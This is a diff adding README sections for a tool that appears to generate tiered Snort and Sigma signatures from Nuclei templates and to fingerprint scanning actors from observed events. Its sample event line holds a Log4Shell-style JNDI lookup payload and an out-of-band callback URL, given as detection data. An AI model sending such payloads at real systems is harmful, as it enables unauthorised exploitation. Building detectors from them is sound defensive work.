@@ -98,6 +98,68 @@ the rare template that specifies enough TLS configuration to nail down a
 ClientHello; otherwise we expose `tls_hints` and a `request_shape` digest
 that play the same role for the layer the template actually controls.
 
+## Signature tiers
+
+Every emitted signature is tagged with the observability tier it can be
+matched at:
+
+| Tier | Consumer example | Buffers |
+| --- | --- | --- |
+| T1 | Access log, CDN log, DNS log | `http_uri`, `cs-uri-stem`, DNS query name |
+| T2 | WAF, SSL-intercepting proxy | `http_user_agent`, `http_header`, `http_cookie` |
+| T3 | Decrypted / cleartext PCAP | `http_client_body`, network payloads |
+| T4 | TLS-opaque PCAP | JA3 / JA4 (`alert tls; ja3.hash;`) |
+| T5 | Outbound proxy, honeypot response cache | `flow:to_client`, `sc-response-body` |
+
+`nucleotide build` writes:
+
+- `--snort-out-dir DIR/` → `nuclei-t1.rules` … `nuclei-t5.rules`
+- `--sigma-out-dir DIR/` → `nuclei-t1.yml`, `nuclei-t5.yml`
+  (the two tiers a SIEM actually ingests)
+- flat combined files are still available via `--snort-out` / `--sigma-out`
+
+## Actor fingerprinting
+
+`nucleotide` also produces a **portable actor fingerprint YAML** from a
+pre-grouped batch of observation events. This is *not* an IDS or SIEM —
+it turns "here's what we saw this actor do" into a reusable artifact you
+can diff against future observations to track behavior drift.
+
+### Input
+
+A JSONL file, one observation per line:
+
+```json
+{"ts":"2026-07-02T14:00:00Z","src_ip":"1.2.3.4","target":"victim.example","uri":"/?x=${jndi:ldap://x/y}","ua":"Nuclei - Open-source project","headers":{"X-Trace-Id":"abc123"},"body":"cb=http://sub.oast.online/probe"}
+```
+
+### Commands
+
+```sh
+nucleotide fingerprint events.jsonl --lookup lookup.json --out actor.yml
+nucleotide compare  ref-actor.yml new-actor.yml
+nucleotide match    new-events.jsonl ref-actor.yml --lookup lookup.json
+```
+
+### Output
+
+The fingerprint captures:
+
+- **Tool inference**: `likely_tool` (nuclei / non-nuclei-consuming-YAMLs /
+  unknown) with a signal list (default UA, `-random-agent` pool, default
+  OAST hosts, known template hits) and a contradictions list.
+- **Inferred CLI options** (all optional; `null` when not distinguishable
+  from a full scan): `-severity`, `-tags`, `-H` (custom headers, either
+  as literal or as a shape template like `{uuid}` / `{hex-32}`),
+  `-random-agent`, `-interactsh-server`, `-rate-limit`, `-bulk-size`,
+  `-scan-strategy` (template-spray / host-spray / mixed).
+- **Template preference**: hit templates and counts, plus a list of
+  novel probes that look Nuclei-shaped but didn't match a known
+  template (potential custom templates).
+- **`structural_hash`**: deterministic SHA-256 over the (tool, options,
+  template subset) tuple. Two independent analyses of the same actor's
+  behavior collapse to the same hash.
+
 ## Install
 
 ```sh
